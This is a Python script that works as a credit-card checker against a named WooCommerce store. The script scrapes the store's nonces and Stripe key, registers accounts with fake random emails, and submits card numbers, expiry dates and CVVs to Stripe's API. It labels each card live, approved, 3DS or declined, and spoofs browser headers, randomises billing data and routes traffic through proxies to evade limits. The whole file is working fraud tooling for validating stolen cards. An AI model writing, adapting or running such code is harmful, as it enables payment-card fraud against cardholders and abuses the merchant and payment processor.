import requests
import asyncio
import re
import random
import uuid
import datetime

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36"
]

def _format_proxy(proxy: str | None) -> str | None:
    if not proxy:
        return None
    p = str(proxy).strip()
    if p.startswith(("http://", "https://", "socks5://", "socks4://")):
        return p
    parts = p.split(":")
    if len(parts) == 4:
        if parts[1].isdigit():
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
        elif parts[3].isdigit():
            return f"http://{parts[0]}:{parts[1]}@{parts[2]}:{parts[3]}"
        else:
            return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    elif len(parts) == 2:
        return f"http://{parts[0]}:{parts[1]}"
    return f"http://{p}"

def _check_card_dila_sync(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str | None = None
) -> tuple[str, str, str]:
    if len(yy) == 2:
        yy = "20" + yy[-2:]
    mm = mm.zfill(2)

    session = requests.Session()
    formatted_proxy = _format_proxy(proxy_url)

    user_ag = "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36"
    url_1 = "https://dilaboards.com/en/moj-racun/add-payment-method/"

    try:
        h_pre = {
            'User-Agent': user_ag,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'none',
            'Sec-Fetch-User': '?1',
        }
        r_pre = session.get(url_1, headers=h_pre, timeout=15)
        if "woocommerce-register-nonce" not in r_pre.text and formatted_proxy:
            session.proxies = {"http": formatted_proxy, "https": formatted_proxy}
            r_pre = session.get(url_1, headers=h_pre, timeout=15)

        if r_pre.status_code >= 400:
            return "error", f"page_http_{r_pre.status_code}", "UNKNOWN"

        m_reg = re.findall(r'name="woocommerce-register-nonce" value="(.*?)"', r_pre.text)
        m_pk = re.findall(r'"key":"(.*?)"', r_pre.text)

        if not m_reg or not m_pk:
            return "error", "Failed to extract registration nonce/key", "UNKNOWN"

        reg_nonce = m_reg[0]
        current_pk = m_pk[0]

        fake_email = f"user_{random.randint(100000, 999999)}@gmail.com"

        h_reg = {
            'User-Agent': user_ag,
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://dilaboards.com',
            'Referer': url_1,
            'Upgrade-Insecure-Requests': '1',
            'Sec-Fetch-Dest': 'document',
            'Sec-Fetch-Mode': 'navigate',
            'Sec-Fetch-Site': 'same-origin',
            'Sec-Fetch-User': '?1',
        }

        reg_data = {
            'email': fake_email,
            'wc_order_attribution_source_type': 'typein',
            'wc_order_attribution_referrer': '(none)',
            'wc_order_attribution_utm_campaign': '(none)',
            'wc_order_attribution_utm_source': '(direct)',
            'wc_order_attribution_session_entry': url_1,
            'wc_order_attribution_session_start_time': datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            'wc_order_attribution_session_pages': '2',
            'wc_order_attribution_session_count': '1',
            'wc_order_attribution_user_agent': user_ag,
            'woocommerce-register-nonce': reg_nonce,
            '_wp_http_referer': '/en/moj-racun/add-payment-method/',
            'register': 'Register',
        }

        r_reg = session.post(url_1, headers=h_reg, data=reg_data, timeout=15)
        text_reg = r_reg.text
        low_reg = text_reg.lower()

        if "so soon" in low_reg or "too many" in low_reg:
            return "error", "Rate Limit", "UNKNOWN"

        m_setup = re.findall(r'"createAndConfirmSetupIntentNonce":"(.*?)"', text_reg)
        if not m_setup:
            return "error", "Registration Failed", "UNKNOWN"

        current_nonce = m_setup[0]

        guid = str(uuid.uuid4())
        muid = str(uuid.uuid4())
        sid = str(uuid.uuid4())
        ele_id = f"src_{random.getrandbits(128):032x}"

        h1 = {
            'User-Agent': user_ag,
            'Accept': 'application/json',
            'Referer': 'https://js.stripe.com/',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
        }
        d1 = {
            'type': 'card',
            'card[number]': cc,
            'card[cvc]': cvv,
            'card[exp_year]': yy,
            'card[exp_month]': mm,
            'allow_redisplay': 'unspecified',
            'billing_details[address][postal_code]': str(random.randint(10000, 99999)),
            'billing_details[address][country]': 'US',
            'payment_user_agent': 'stripe.js/c1fbe29896; stripe-js-v3/c1fbe29896; payment-element; deferred-intent',
            'referrer': url_1,
            'time_on_page': str(random.randint(10000, 99999)),
            'client_attribution_metadata[client_session_id]': ele_id,
            'client_attribution_metadata[merchant_integration_source]': 'elements',
            'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
            'client_attribution_metadata[merchant_integration_version]': '2021',
            'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
            'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
            'client_attribution_metadata[elements_session_config_id]': ele_id,
            'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
            'guid': guid,
            'muid': muid,
            'sid': sid,
            'key': current_pk,
            '_stripe_version': '2024-06-20',
        }

        r1 = session.post('https://api.stripe.com/v1/payment_methods', headers=h1, data=d1, timeout=15)
        res1 = r1.json()

        if "error" in res1:
            msg = res1["error"].get("message", "Declined")
            brand = res1.get("card", {}).get("brand", "UNKNOWN")
            if "security code is" in msg.lower():
                return "live", msg, brand
            return "declined", msg, brand

        pm_id = res1["id"]
        brand = res1.get("card", {}).get("brand", "UNKNOWN")

        h2 = {
            'User-Agent': user_ag,
            'Accept': '*/*',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'X-Requested-With': 'XMLHttpRequest',
            'Referer': url_1,
        }
        d2 = {
            'action': 'create_and_confirm_setup_intent',
            'wc-stripe-payment-method': pm_id,
            'wc-stripe-payment-type': 'card',
            '_ajax_nonce': current_nonce,
        }
        final_ajax_url = f"{url_1}?wc-ajax=wc_stripe_create_and_confirm_setup_intent"
        r2 = session.post(final_ajax_url, headers=h2, data=d2, timeout=20)
        if r2.status_code == 429:
            return "error", "Rate Limited (429)", brand

        res2 = r2.json()
        success = res2.get('success', False)
        status_val = (res2.get('data') or {}).get('status', 'unknown')

        if success or status_val == 'succeeded':
            return "approved", "Payment method added successfully.", brand

        msg = (res2.get('data') or {}).get('message') or res2.get('message') or "Declined"
        if isinstance(msg, dict):
            msg = msg.get("message", str(msg))
        msg = str(msg)

        low_msg = msg.lower()
        if "security code is" in low_msg:
            return "live", msg, brand
        if any(x in low_msg for x in ("authenticate", "challenge", "3d")):
            return "3ds", "3DS Challenge Required", brand

        return "declined", msg, brand

    except Exception as e:
        return "error", f"Error: {e}", "UNKNOWN"


async def check_card_dila(
    cc: str,
    mm: str,
    yy: str,
    cvv: str,
    proxy_url: str | None = None
) -> tuple[str, str, str]:
    return await asyncio.to_thread(_check_card_dila_sync, cc, mm, yy, cvv, proxy_url)
